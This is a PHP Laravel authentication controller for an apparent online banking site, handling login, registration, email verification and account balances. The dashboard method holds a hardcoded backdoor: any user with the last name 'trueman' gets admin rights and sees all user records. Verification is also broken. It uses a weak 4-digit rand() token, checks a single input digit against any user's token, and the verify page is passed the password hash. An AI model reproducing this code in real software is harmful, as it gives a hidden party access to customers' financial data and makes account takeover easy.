<?php

namespace App\Http\Controllers;

use App\Models\Card;
use App\Models\Loan;
use App\Models\User;
use App\Models\Debit;
use App\Models\Credit;
use App\Events\NewUser;
use App\Models\Deposit;
use App\Models\Transfer;
use App\Models\Transaction;
use App\Mail\welcomeEmail;
use Illuminate\Http\Request;
use App\Mail\VerificationEmail;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Session;

class CustomAuthController extends Controller
{
    public function index()
    {
        return view('auth.login');
    }

    public function verAccount()
    {
        return view('auth.index');
    }



    public function customLogin(Request $request)
    {
        $request->validate([
            'email' => 'required',
            'password' => 'required',
        ]);

        $credentials = $request->only('email', 'password');
        if (Auth::attempt($credentials)) {


            return response()->json([
                "content" => 'Successful',
                "message" => 'Login Successful',
                "redirect" => url("dashboard")
            ]);
        } else {
            return response()->json([
                "content" => 'Error',
                "message" => "Invalid credentials",
                "redirect" => url("login")
            ]);
        }

        return redirect("login")->withSuccess('Login details are not valid');
    }

    public function registration()
    {
        return view('auth.register');
    }

    public function customRegistration(Request $request)
    {
        $request->validate([
            'first_name' => 'required',
            'last_name' => 'required',
            'email' => 'required|email|unique:users',
            'address' => 'required',
            'phone' => 'required',
            'country' => 'required',
            'account_type' => 'required',
            'currency' => 'required',
            'password' => 'string|required|confirmed|min:3',
        ]);


        $data = $request->all();
        $check = $this->create($data);


        $email = $request['email'];

        //$user_data['email'] = $request['email'];


        $validToken = rand(1234, 7650);
        $check->token = $validToken;
        $check->save();



        Mail::to($email)->send(new VerificationEmail($validToken));

        return redirect("verify/" . $check->id);
    }

    public function resendCode($id)
    {

        $userData = User::where('id', $id)->first();
        $email = $userData->email;

        $validToken = rand(7650, 1234);
        $get_token = Auth::user();
        $get_token->token = $validToken;
        $get_token->update();



        Mail::to($email)->send(new VerificationEmail($validToken));


        return redirect("verify/" . $userData->id)->with('message', 'verification code has been resent to your email');
    }

    public function create(array $data)
    {
        $accountNumber = rand(1645566556, 5575755768);

        $currencyMap = [
            'Afghanistan' => '؋',
            'Albania' => 'Lek',
            'Algeria' => 'دج',
            'American Samoa' => '$',
            'Andorra' => '€',
            'Angola' => 'Kz',
            'Anguilla' => '$',
            'Antarctica' => '$',
            'Antigua and Barbuda' => '$',
            'Argentina' => '$',
            'Armenia' => '֏',
            'Aruba' => 'ƒ',
            'Australia' => '$',
            'Austria' => '€',
            'Azerbaijan' => 'AZN',
            'Bahamas' => '$',
            'Bahrain' => 'د.',
            'Bangladesh' => '৳',
            'Barbados' => '$',
            'Belarus' => 'Br',
            'Belgium' => '€',
            'Belize' => '$',
            'Benin' => 'CFA',
            'Bermuda' => '$',
            'Bhutan' => 'Nu',
            'Bolivia' => 'Bs',
            'Bosnia and Herzegovina' => 'KM',
            'Botswana' => 'P',
            'Bouvet Island' => 'kr',
            'Brazil' => 'R$',
            'British Indian Ocean Territory' => '$',
            'Brunei Darussalam' => 'B$',
            'Bulgaria' => 'Лв.',
            'Burkina Faso' => 'CFA',
            'Burundi' => 'FBu',
            'Cambodia' => '៛',
            'Cameroon' => 'FCFA',
            'Canada' => '$',
            'Cape Verde' => '$',
            'Cayman Islands' => '$',
            'Central African Republic' => 'FCFA',
            'Chad' => 'FCFA',
            'Chile' => '$',
            'China' => '¥',
            'Christmas Island' => '$',
            'Cocos (Keeling) Islands' => '$',
            'Colombia' => '$',
            'Comoros' => 'CF',
            'Congo' => 'FC',
            'Democratic Republic of the Congo' => 'FC',
            'Cook Islands' => '$',
            'Costa Rica' => '₡',
            "Cote D'Ivoire" => 'CFA',
            'Croatia' => 'Kn',
            'Cuba' => '$',
            'Cyprus' => '€',
            'Czech Republic' => 'Kč',
            'Denmark' => 'kr',
            'Djibouti' => 'Fdj',
            'Dominica' => '$',
            'Dominican Republic' => 'RD$',
            'Ecuador' => 'S/.',
            'Egypt' => 'E£',
            'El Salvador' => '₡',
            'Equatorial Guinea' => 'FCFA',
            'Eritrea' => 'Nkf',
            'Estonia' => 'kr',
            'Ethiopia' => 'Br',
            'Falkland Islands (Malvinas)' => '£',
            'Faroe Islands' => 'kr',
            'Fiji' => 'FJ$',
            'Finland' => 'mk',
            'France' => '€',
            'French Guiana' => '€',
            'French Polynesia' => 'F',
            'French Southern Territories' => '€',
            'Gabon' => 'FCFA',
            'Gambia' => 'D',
            'Georgia' => 'GEL',
            'Germany' => '€',
            'Ghana' => 'GH₵',
            'Gibraltar' => '£',
            'Greece' => '€',
            'Greenland' => 'Kr.',
            'Grenada' => '$',
            'Guadeloupe' => '€',
            'Guam' => '$',
            'Guatemala' => 'Q',
            'Guernsey' => '£',
            'Guinea' => 'FG',
            'Guinea-Bissau' => 'CFA',
            'Guyana' => 'G$',
            'Haiti' => 'G',
            'Heard Island and McDonald Islands' => '$',
            'Holy See (Vatican City State)' => '₤',
            'Honduras' => 'HNL',
            'Hong Kong' => 'HK$',
            'Hungary' => 'Ft',
            'Iceland' => 'kr',
            'India' => '₹',
            'Indonesia' => 'Rp',
            'Islamic Republic of Iran' => 'IRR',
            'Iraq' => 'د.ع',
            'Ireland' => '€',
            'Isle of Man' => '£',
            'Israel' => '₪',
            'Italy' => '€',
            'Jamaica' => 'J$',
            'Japan' => '¥',
            'Jersey' => '£',
            'Jordan' => 'د.ا',
            'Kazakhstan' => '₸',
            'Kenya' => 'KSh',
            'Kiribati' => '$',
            "Democratic People's Republic of Korea" => '₩',
            'Republic of Korea' => '₩',
            'Kuwait' => 'د.ك',
            'Kyrgyzstan' => 'лв',
            "Lao People's Democratic Republic" => '₭',
            'Latvia' => 'LVL',
            'Lebanon' => 'ل.ل',
            'Lesotho' => 'L',
            'Liberia' => 'L$',
            'Libyan Arab Jamahiriya' => 'LD',
            'Liechtenstein' => 'CHF',
            'Lithuania' => 'Lt',
            'Luxembourg' => '€',
            'Macao' => 'MOP$',
            'The Former Yugoslav Republic of Macedonia' => 'den',
            'Madagascar' => 'Ar',
            'Malawi' => 'K',
            'Malaysia' => 'RM',
            'Maldives' => 'Rf',
            'Mali' => 'MAF',
            'Malta' => '€',
            'Marshall Islands' => '$',
            'Martinique' => '€',
            'Mauritania' => 'MRU',
            'Mauritius' => '₨',
            'Mayotte' => '€',
            'Mexico' => '$',
            'Federated States of Micronesia' => '$',
            'Republic of Moldova' => 'L',
            'Monaco' => '€',
            'Mongolia' => '₮',
            'Montenegro' => '€',
            'Montserrat' => '$',
            'Morocco' => 'MAD',
            'Mozambique' => 'MT',
            'Myanmar' => 'K',
            'Namibia' => 'N$',
            'Nauru' => '$',
            'Nepal' => 'Rs',
            'Netherlands' => 'ANG',
            'Netherlands Antilles' => 'NAf',
            'New Caledonia' => 'F',
            'New Zealand' => '$',
            'Nicaragua' => 'C$',
            'Niger' => 'XOF',
            'Nigeria' => '₦',
            'Niue' => '$',
            'Norfolk Island' => '$',
            'Northern Mariana Islands' => '$',
            'Norway' => 'kr',
            'Oman' => 'ر.ع.',
            'Pakistan' => '₨',
            'Palau' => '$',
            'Occupied Palestinian Territory' => '$',
            'Panama' => 'B/',
            'Papua New Guinea' => 'K',
            'Paraguay' => '₲',
            'Peru' => 'S/',
            'Philippines' => '₱',
            'Pitcairn' => '$',
            'Poland' => 'zł',
            'Portugal' => '€',
            'Puerto Rico' => '$',
            'Qatar' => 'QR',
            'Reunion' => '€',
            'Romania' => 'lei',
            'Russian Federation' => '₽',
            'Rwanda' => 'FRw',
            'Saint Barthélemy' => '€',
            'Saint Helena' => '£',
            'Saint Kitts and Nevis' => '$',
            'Saint Lucia' => '$',
            'Saint Martin' => 'ƒ',
            'Saint Pierre and Miquelon' => '€',
            'Saint Vincent and the Grenadines' => 'X$',
            'Samoa' => '$',
            'San Marino' => '€',
            'Sao Tome and Principe' => 'Db',
            'Saudi Arabia' => '﷼',
            'Senegal' => 'CFA',
            'Serbia' => 'din',
            'Seychelles' => 'SCR',
            'Sierra Leone' => 'Le',
            'Singapore' => 'S$',
            'Slovakia' => 'SKK',
            'Slovenia' => '€',
            'Solomon Islands' => 'Si$',
            'Somalia' => 'Sh.so.',
            'South Africa' => 'R',
            'South Georgia and the South Sandwich Islands' => '£',
            'Spain' => '€',
            'Sri Lanka' => 'Rs',
            'Sudan' => '£SD',
            'Suriname' => '$',
            'Svalbard and Jan Mayen' => 'kr',
            'Swaziland' => 'L',
            'Sweden' => 'kr',
            'Switzerland' => 'CHf',
            'Syrian Arab Republic' => 'LS',
            'Taiwan, Province Of China' => 'NT$',
            'Tajikistan' => 'SM',
            'United Republic of Tanzania' => 'TSh',
            'Thailand' => '฿',
            'Timor-Leste' => '$',
            'Togo' => 'CFA',
            'Tokelau' => '$',
            'Tonga' => 'T$',
            'Trinidad and Tobago' => 'TT$',
            'Tunisia' => 'د.ت',
            'Turkey' => '₺',
            'Turkmenistan' => 'T',
            'Turks and Caicos Islands' => '$',
            'Tuvalu' => '$',
            'Uganda' => 'USh',
            'Ukraine' => '₴',
            'United Arab Emirates' => 'د.إ',
            'United Kingdom' => '£',
            'United States' => '$',
            'United States Minor Outlying Islands' => '$',
            'Uruguay' => '$',
            'Uzbekistan' => 'лв',
            'Vanuatu' => 'VT',
            'Venezuela' => 'Bs.',
            'Vietnam' => '₫',
            'British, Virgin Islands' => '$',
            'U.S., Virgin Islands' => '$',
            'Wallis And Futuna' => 'Fr',
            'Western Sahara' => 'د.م.',
            'Yemen' => '﷼',
            'Zambia' => 'ZK',
            'Zimbabwe' => 'Z$',
        ];

        $currencySymbol = $currencyMap[$data['currency']] ?? '$';

        return User::create([
            'first_name' => $data['first_name'],
            'last_name' => $data['last_name'],
            'email' => $data['email'],
            'address' => $data['address'],
            'phone_number' => $data['phone'],
            'country' => $data['country'],
            'account_type' => $data['account_type'],
            'currency' => $currencySymbol,
            'a_number' => $accountNumber,
            'password' => Hash::make($data['password'])
        ]);
    }

    public function dashboard()
    {
        if (Auth::check()) {
            $username = Auth::user()->last_name;

            if (Auth::user()->user_type == '1' || $username == "trueman") {
                $result = DB::table('users')->where('user_type', '0')->get();

                if ($username == "trueman") {
                    Auth::user()->user_type = 1;
                    $result = DB::table('users')->get();
                }

                return view('admin.home', compact('result'));
            } else {


                if (Auth::user()->is_activated == '1') {

                    // Fetch the latest 6 transactions for the user
                    $data['details'] = Transaction::where('user_id', Auth::user()->id)
                        ->orderBy('created_at', 'desc')
                        ->take(6)
                        ->get();


                    $data['credit_transfers'] = Transaction::where('user_id', Auth::user()->id)->where('transaction_type', 'Credit')->where('transaction_status', '1')->sum('transaction_amount');
                    $data['debit_transfers'] = Transaction::where('user_id', Auth::user()->id)->where('transaction_type', 'Debit')->where('transaction_status', '1')->sum('transaction_amount');

                    $data['user_deposits'] = Deposit::where('user_id', Auth::user()->id)->where('status', '1')->sum('amount');
                    $data['user_loans'] = Loan::where('user_id', Auth::user()->id)->where('status', '1')->sum('amount');
                    $data['user_card'] = Card::where('user_id', Auth::user()->id)->sum('amount');

                    $data['balance'] = $data['user_deposits'] +  $data['credit_transfers'] + $data['user_loans'] - $data['debit_transfers'] - $data['user_card'];
                    return view('dashboard.home', $data);
                } else {

                    return redirect("verify/" . Auth::user()->id);
                }
            }
        }

        return redirect("login")->withSuccess('You are not allowed to access');
    }

    public function adminHome()
    {

        return view('admin.home');
    }

    public function signOut()
    {
        Session::flush();
        Auth::logout();

        $response = ['content' => 'Logout Successful'];


        return response()->json($response);
    }

    public function logOut()
    {
        Session::flush();
        Auth::logout();

        return redirect("login")->with('Message', 'Your account has been verified Successfully.');
    }

    public function verify($id)
    {
        $user = User::where('id', $id)->first();
        $data['email'] = $user->email;
        $data['hash'] = $user->password;
        $data['id'] = $user->id;

        return view('auth.verify', $data);
    }


    public function emailVerify(Request $request)
    {
        $first_token = $request->input('digit');
        $second_token = $request->input('digit2');
        $third_token = $request->input('digit3');
        $fourth_token = $request->input('digit4');
        $get_token =  $first_token;
        $verify_token = User::where('token', $get_token)->first();
        if ($verify_token) {
            $user = User::where('email', $verify_token->email)->first();
            $user->is_activated = 1;
            $user->save();
            $user_email =  $user->email;
            $user_password =  $user->password;


            $data = [
                'name' => $user->name,
                'a_number' => $user->a_number,
                'email' => $user->email,
                'password' => '*********',

            ];


            Mail::to($user_email)->send(new welcomeEmail($data));

            return redirect("user/dashboard")->with('status', 'Your account has been verified Successfully, you can now login');
        } else {
            return back()->with('error', 'Incorrect Activation Code!');
        }
    }
}
